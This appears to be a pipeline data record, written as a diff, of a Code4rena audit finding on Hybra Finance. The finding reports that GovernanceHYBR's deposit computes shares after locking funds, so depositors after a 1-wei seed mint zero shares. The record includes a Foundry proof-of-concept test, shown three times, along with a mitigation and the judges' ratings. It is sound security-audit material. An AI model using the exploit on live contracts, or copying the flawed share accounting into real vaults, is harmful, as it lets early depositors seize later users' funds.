@@ -1,0 +1,118 @@
+{
+  "pairing": {
+    "match_status": "exact_submission",
+    "project": "Hybra Finance_xo4hapwL2Jy",
+    "audit_uid": "xo4hapwL2Jy",
+    "requested_submission_uid": "YFfbDGPYnUz",
+    "requested_finding_uid": "7RVCVStDrsF",
+    "source_kind": "pipeline_findings",
+    "source_path": "/root/sc_slicer_standalone/c4_pipeline_output/Hybra_Finance_xo4hapwL2Jy/20260618_145600/findings.json",
+    "source_submission_uid": "YFfbDGPYnUz",
+    "source_finding_uid": "7RVCVStDrsF",
+    "original_report_path": "Hybra Finance_xo4hapwL2Jy\\high_valid_YFfbDGPYnUz.json",
+    "note": "The report is the exact submission paired with this contract."
+  },
+  "submission_uid": "YFfbDGPYnUz",
+  "finding_uid": "7RVCVStDrsF",
+  "finding_number": "89",
+  "title": "Post-deposit accounting in GrowthHYBR mints fewer shares than expected (worst case: 0 shares)",
+  "severity": "high",
+  "validity": "valid",
+  "quality": "sufficient",
+  "user_handle": "testnate",
+  "body": "## Finding description and impact\n\nIn ve33/contracts/GovernanceHYBR.sol, `deposit()` locks the incoming HYBR into the veNFT first and then calculates gHYBR shares. `calculateShares` reads `totalAssets` after it already includes the new deposit. The effective formula becomes `shares = amount * totalSupply / (assets_before + amount)`. This inflates the denominator with the depositor’s own funds and causes minting less shares than expected.\n\nIn the extreme case, a first 1 wei seed creates totalSupply = 1 and totalAssets = 1. For any later deposit of amount > 0, the minted shares are `floor(amount * 1 / (1 + amount)) = 0`, since the denominator strictly exceeds the numerator. More generally, depositors mint fewer shares than the correct pre-deposit pro-rata amount, causing a short-mint and value transfer to existing holders. Worst case, deposits mint 0 shares.\n\nThe PoC `test_gHybr_DepositPostAssetAccounting_DonatesFunds` demonstrates the extreme case and shows that three subsequent deposits each mint zero shares; the PoC has no output and succeeds when it passes all assertions. To run it: `forge test --match-test DepositPostAssetAccounting_DonatesFunds -vvv`\n\n## Recommended mitigation steps\n\nCompute shares from a pre-deposit snapshot of totalSupply and totalAssets, before moving or locking the new amount. Then lock the funds and mint the precomputed shares.",
+  "proof_of_concept": "function test_gHybr_DepositPostAssetAccounting_DonatesFunds() external {\n        address alice = address(0xA11CE);\n        address bob = address(0xB0B);\n        address carol = address(0xCAFE);\n        address dave = address(0xD00D);\n\n        uint256 aliceAmt = 1; // 1 wei\n        uint256 bobAmt = 1e18; // large amount\n        uint256 carolAmt = 5e18; // another large amount\n        uint256 daveAmt = 123_456_789; // arbitrary amount\n\n        // Fund users from deployer.\n        hybr.transfer(alice, aliceAmt);\n        hybr.transfer(bob, bobAmt);\n        hybr.transfer(carol, carolAmt);\n        hybr.transfer(dave, daveAmt);\n\n        // Alice approves and deposits 1 wei: initializes ve and mints 1 share.\n        vm.startPrank(alice);\n        hybr.approve(address(gHybr), type(uint256).max);\n        gHybr.deposit(aliceAmt, alice);\n        vm.stopPrank();\n\n        assertEq(gHybr.totalSupply(), 1, \"First deposit should mint 1 share.\");\n        assertEq(gHybr.totalAssets(), 1, \"Assets should equal 1 after first deposit.\");\n\n        // Bob approves and deposits a large amount.\n        // Current code locks funds first, then computes shares from post-deposit assets,\n        // leading to shares = floor(bobAmt * 1 / (1 + bobAmt)) = 0.\n        vm.startPrank(bob);\n        hybr.approve(address(gHybr), type(uint256).max);\n        gHybr.deposit(bobAmt, bob);\n        vm.stopPrank();\n\n        // Carol approves and deposits: shares = 0 as well.\n        vm.startPrank(carol);\n        hybr.approve(address(gHybr), type(uint256).max);\n        gHybr.deposit(carolAmt, carol);\n        vm.stopPrank();\n\n        // Dave approves and deposits: shares = 0 as well.\n        vm.startPrank(dave);\n        hybr.approve(address(gHybr), type(uint256).max);\n        gHybr.deposit(daveAmt, dave);\n        vm.stopPrank();\n\n        // Bob, Carol and Dave receive zero shares.\n        assertEq(gHybr.balanceOf(bob), 0, \"Bob should receive 0 shares.\");\n        assertEq(gHybr.balanceOf(carol), 0, \"Carol should receive 0 shares.\");\n        assertEq(gHybr.balanceOf(dave), 0, \"Dave should receive 0 shares.\");\n\n        // Supply stays 1; Alice captures all value; assets include all deposits.\n        assertEq(gHybr.totalSupply(), 1, \"Total supply must remain 1.\");\n        assertEq(gHybr.balanceOf(alice), gHybr.totalSupply(), \"Alice captured all value.\");\n        assertEq(gHybr.totalAssets(), aliceAmt + bobAmt + carolAmt + daveAmt, \"Assets should include all deposits.\");\n    }",
+  "lines_of_code": [
+    "https://github.com/code-423n4/2025-10-hybra-finance/blob/74c2b93e8a4796c1d41e1fbaa07e40b426944c44/ve33/contracts/GovernanceHYBR.sol#L131-L144"
+  ],
+  "source_record": {
+    "project_id": "xo4hapwL2Jy",
+    "submission_index": "686",
+    "api_submission_id": "",
+    "uid": "YFfbDGPYnUz",
+    "number": "686",
+    "title": "Post-deposit accounting in GrowthHYBR mints fewer shares than expected (worst case: 0 shares)",
+    "severity": "high",
+    "validity": "valid",
+    "quality": "sufficient",
+    "handle": "testnate",
+    "lines_of_code": [
+      "https://github.com/code-423n4/2025-10-hybra-finance/blob/74c2b93e8a4796c1d41e1fbaa07e40b426944c44/ve33/contracts/GovernanceHYBR.sol#L131-L144"
+    ],
+    "body": "## Finding description and impact\n\nIn ve33/contracts/GovernanceHYBR.sol, `deposit()` locks the incoming HYBR into the veNFT first and then calculates gHYBR shares. `calculateShares` reads `totalAssets` after it already includes the new deposit. The effective formula becomes `shares = amount * totalSupply / (assets_before + amount)`. This inflates the denominator with the depositor’s own funds and causes minting less shares than expected.\n\nIn the extreme case, a first 1 wei seed creates totalSupply = 1 and totalAssets = 1. For any later deposit of amount > 0, the minted shares are `floor(amount * 1 / (1 + amount)) = 0`, since the denominator strictly exceeds the numerator. More generally, depositors mint fewer shares than the correct pre-deposit pro-rata amount, causing a short-mint and value transfer to existing holders. Worst case, deposits mint 0 shares.\n\nThe PoC `test_gHybr_DepositPostAssetAccounting_DonatesFunds` demonstrates the extreme case and shows that three subsequent deposits each mint zero shares; the PoC has no output and succeeds when it passes all assertions. To run it: `forge test --match-test DepositPostAssetAccounting_DonatesFunds -vvv`\n\n## Recommended mitigation steps\n\nCompute shares from a pre-deposit snapshot of totalSupply and totalAssets, before moving or locking the new amount. Then lock the funds and mint the precomputed shares.",
+    "proof_of_concept": "function test_gHybr_DepositPostAssetAccounting_DonatesFunds() external {\n        address alice = address(0xA11CE);\n        address bob = address(0xB0B);\n        address carol = address(0xCAFE);\n        address dave = address(0xD00D);\n\n        uint256 aliceAmt = 1; // 1 wei\n        uint256 bobAmt = 1e18; // large amount\n        uint256 carolAmt = 5e18; // another large amount\n        uint256 daveAmt = 123_456_789; // arbitrary amount\n\n        // Fund users from deployer.\n        hybr.transfer(alice, aliceAmt);\n        hybr.transfer(bob, bobAmt);\n        hybr.transfer(carol, carolAmt);\n        hybr.transfer(dave, daveAmt);\n\n        // Alice approves and deposits 1 wei: initializes ve and mints 1 share.\n        vm.startPrank(alice);\n        hybr.approve(address(gHybr), type(uint256).max);\n        gHybr.deposit(aliceAmt, alice);\n        vm.stopPrank();\n\n        assertEq(gHybr.totalSupply(), 1, \"First deposit should mint 1 share.\");\n        assertEq(gHybr.totalAssets(), 1, \"Assets should equal 1 after first deposit.\");\n\n        // Bob approves and deposits a large amount.\n        // Current code locks funds first, then computes shares from post-deposit assets,\n        // leading to shares = floor(bobAmt * 1 / (1 + bobAmt)) = 0.\n        vm.startPrank(bob);\n        hybr.approve(address(gHybr), type(uint256).max);\n        gHybr.deposit(bobAmt, bob);\n        vm.stopPrank();\n\n        // Carol approves and deposits: shares = 0 as well.\n        vm.startPrank(carol);\n        hybr.approve(address(gHybr), type(uint256).max);\n        gHybr.deposit(carolAmt, carol);\n        vm.stopPrank();\n\n        // Dave approves and deposits: shares = 0 as well.\n        vm.startPrank(dave);\n        hybr.approve(address(gHybr), type(uint256).max);\n        gHybr.deposit(daveAmt, dave);\n        vm.stopPrank();\n\n        // Bob, Carol and Dave receive zero shares.\n        assertEq(gHybr.balanceOf(bob), 0, \"Bob should receive 0 shares.\");\n        assertEq(gHybr.balanceOf(carol), 0, \"Carol should receive 0 shares.\");\n        assertEq(gHybr.balanceOf(dave), 0, \"Dave should receive 0 shares.\");\n\n        // Supply stays 1; Alice captures all value; assets include all deposits.\n        assertEq(gHybr.totalSupply(), 1, \"Total supply must remain 1.\");\n        assertEq(gHybr.balanceOf(alice), gHybr.totalSupply(), \"Alice captured all value.\");\n        assertEq(gHybr.totalAssets(), aliceAmt + bobAmt + carolAmt + daveAmt, \"Assets should include all deposits.\");\n    }",
+    "detail_url": "https://code4rena.com/api/v1/audits/xo4hapwL2Jy/submissions/686",
+    "raw": {
+      "auditUid": "xo4hapwL2Jy",
+      "createdAt": "2025-10-15T23:41:24.484Z",
+      "deletedAt": null,
+      "evaluations": [
+        {
+          "uid": "GBzuPHicNLs",
+          "userUid": "67uFCZeAHcw",
+          "userAuditRole": "judge",
+          "createdAt": "2025-10-17T08:45:55.858Z",
+          "type": "validity",
+          "value": "valid",
+          "submissionUid": null,
+          "findingUid": "7RVCVStDrsF"
+        },
+        {
+          "uid": "Ji2d97Mqnrw",
+          "userUid": "67uFCZeAHcw",
+          "userAuditRole": "judge",
+          "createdAt": "2025-10-17T09:39:51.808Z",
+          "type": "quality",
+          "value": "sufficient",
+          "submissionUid": "YFfbDGPYnUz",
+          "findingUid": null
+        },
+        {
+          "uid": "DpfmFrRnXFM",
+          "userUid": "6LS9McgpnmC",
+          "userAuditRole": "judge",
+          "createdAt": "2025-11-05T15:00:31.378Z",
+          "type": "severity",
+          "value": "high",
+          "submissionUid": null,
+          "findingUid": "7RVCVStDrsF"
+        }
+      ],
+      "finding": {
+        "uid": "7RVCVStDrsF",
+        "number": 89,
+        "duplicates": 39
+      },
+      "isPrimary": false,
+      "latestEvaluations": {
+        "credit": null,
+        "mitigationStatus": null,
+        "quality": "sufficient",
+        "rank": null,
+        "severity": "high",
+        "validity": "valid",
+        "updatedAt": "2025-11-05T15:00:31.378Z"
+      },
+      "mitigationOf": null,
+      "mitigationStatus": null,
+      "severity": "high",
+      "team": null,
+      "title": "Post-deposit accounting in GrowthHYBR mints fewer shares than expected (worst case: 0 shares)",
+      "uid": "YFfbDGPYnUz",
+      "updatedAt": "2025-10-15T23:41:24.484Z",
+      "user": {
+        "uid": "eKGFFESSAEF",
+        "handle": "testnate"
+      },
+      "sensitivity": "non-sensitive",
+      "aiSeverity": null,
+      "aiValidity": null,
+      "body": "## Finding description and impact\n\nIn ve33/contracts/GovernanceHYBR.sol, `deposit()` locks the incoming HYBR into the veNFT first and then calculates gHYBR shares. `calculateShares` reads `totalAssets` after it already includes the new deposit. The effective formula becomes `shares = amount * totalSupply / (assets_before + amount)`. This inflates the denominator with the depositor’s own funds and causes minting less shares than expected.\n\nIn the extreme case, a first 1 wei seed creates totalSupply = 1 and totalAssets = 1. For any later deposit of amount > 0, the minted shares are `floor(amount * 1 / (1 + amount)) = 0`, since the denominator strictly exceeds the numerator. More generally, depositors mint fewer shares than the correct pre-deposit pro-rata amount, causing a short-mint and value transfer to existing holders. Worst case, deposits mint 0 shares.\n\nThe PoC `test_gHybr_DepositPostAssetAccounting_DonatesFunds` demonstrates the extreme case and shows that three subsequent deposits each mint zero shares; the PoC has no output and succeeds when it passes all assertions. To run it: `forge test --match-test DepositPostAssetAccounting_DonatesFunds -vvv`\n\n## Recommended mitigation steps\n\nCompute shares from a pre-deposit snapshot of totalSupply and totalAssets, before moving or locking the new amount. Then lock the funds and mint the precomputed shares.",
+      "proofOfConcept": "function test_gHybr_DepositPostAssetAccounting_DonatesFunds() external {\n        address alice = address(0xA11CE);\n        address bob = address(0xB0B);\n        address carol = address(0xCAFE);\n        address dave = address(0xD00D);\n\n        uint256 aliceAmt = 1; // 1 wei\n        uint256 bobAmt = 1e18; // large amount\n        uint256 carolAmt = 5e18; // another large amount\n        uint256 daveAmt = 123_456_789; // arbitrary amount\n\n        // Fund users from deployer.\n        hybr.transfer(alice, aliceAmt);\n        hybr.transfer(bob, bobAmt);\n        hybr.transfer(carol, carolAmt);\n        hybr.transfer(dave, daveAmt);\n\n        // Alice approves and deposits 1 wei: initializes ve and mints 1 share.\n        vm.startPrank(alice);\n        hybr.approve(address(gHybr), type(uint256).max);\n        gHybr.deposit(aliceAmt, alice);\n        vm.stopPrank();\n\n        assertEq(gHybr.totalSupply(), 1, \"First deposit should mint 1 share.\");\n        assertEq(gHybr.totalAssets(), 1, \"Assets should equal 1 after first deposit.\");\n\n        // Bob approves and deposits a large amount.\n        // Current code locks funds first, then computes shares from post-deposit assets,\n        // leading to shares = floor(bobAmt * 1 / (1 + bobAmt)) = 0.\n        vm.startPrank(bob);\n        hybr.approve(address(gHybr), type(uint256).max);\n        gHybr.deposit(bobAmt, bob);\n        vm.stopPrank();\n\n        // Carol approves and deposits: shares = 0 as well.\n        vm.startPrank(carol);\n        hybr.approve(address(gHybr), type(uint256).max);\n        gHybr.deposit(carolAmt, carol);\n        vm.stopPrank();\n\n        // Dave approves and deposits: shares = 0 as well.\n        vm.startPrank(dave);\n        hybr.approve(address(gHybr), type(uint256).max);\n        gHybr.deposit(daveAmt, dave);\n        vm.stopPrank();\n\n        // Bob, Carol and Dave receive zero shares.\n        assertEq(gHybr.balanceOf(bob), 0, \"Bob should receive 0 shares.\");\n        assertEq(gHybr.balanceOf(carol), 0, \"Carol should receive 0 shares.\");\n        assertEq(gHybr.balanceOf(dave), 0, \"Dave should receive 0 shares.\");\n\n        // Supply stays 1; Alice captures all value; assets include all deposits.\n        assertEq(gHybr.totalSupply(), 1, \"Total supply must remain 1.\");\n        assertEq(gHybr.balanceOf(alice), gHybr.totalSupply(), \"Alice captured all value.\");\n        assertEq(gHybr.totalAssets(), aliceAmt + bobAmt + carolAmt + daveAmt, \"Assets should include all deposits.\");\n    }",
+      "linesOfCode": "https://github.com/code-423n4/2025-10-hybra-finance/blob/74c2b93e8a4796c1d41e1fbaa07e40b426944c44/ve33/contracts/GovernanceHYBR.sol#L131-L144",
+      "number": 686,
+      "aiExplanation": null,
+      "_index": 686
+    }
+  }
+}
